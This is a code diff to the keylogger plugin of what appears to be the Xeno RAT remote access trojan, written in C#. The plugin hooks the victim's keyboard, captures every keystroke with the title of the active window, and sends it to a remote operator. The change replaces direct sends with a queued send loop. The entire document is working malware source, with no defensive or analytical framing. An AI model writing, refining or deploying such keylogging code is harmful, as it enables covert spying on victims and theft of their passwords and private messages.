@@ -7,6 +7,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Windows.Forms.VisualStyles;
 using xeno_rat_client;
 
 
@@ -33,6 +34,8 @@ namespace Plugin
         Node node;
 
 
+        List<string[]> SendQueue = new List<string[]>();
+
         public async Task Run(Node node)
         {
             await node.SendAsync(new byte[] { 3 });//indicate that it has connected
@@ -50,8 +53,13 @@ namespace Plugin
             }).Start();
             while (node.Connected())
             {
-                Application.DoEvents();
-                await Task.Delay(1);
+                if (SendQueue.Count > 0) 
+                {
+                    if (SendQueue[0].Length != 2) continue;
+                    await sendKeyData(SendQueue[0][0], SendQueue[0][1]);
+                    SendQueue.RemoveAt(0);
+                }
+                await Task.Delay(10);
             }
             if (hookHandle != IntPtr.Zero) 
             {
@@ -60,9 +68,9 @@ namespace Plugin
 
         }
 
-        public async Task sendKeyData(string charectar) 
+        public async Task sendKeyData(string open_application, string charectar) 
         {
-            string open_application = xeno_rat_client.Utils.GetCaptionOfActiveWindow().Replace("*", "");
+            
             if (node == null || !node.Connected()) return;
             await node.SendAsync(Encoding.UTF8.GetBytes(open_application));
             await node.SendAsync(Encoding.UTF8.GetBytes(charectar));
@@ -79,7 +87,9 @@ namespace Plugin
                 {
                     character= character.ToUpper();
                 }
-                sendKeyData(character);
+                string open_application = xeno_rat_client.Utils.GetCaptionOfActiveWindow().Replace("*", "");
+                string[] sendData = new string[] { open_application, character };
+                SendQueue.Add(sendData);
             }
             return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
         }
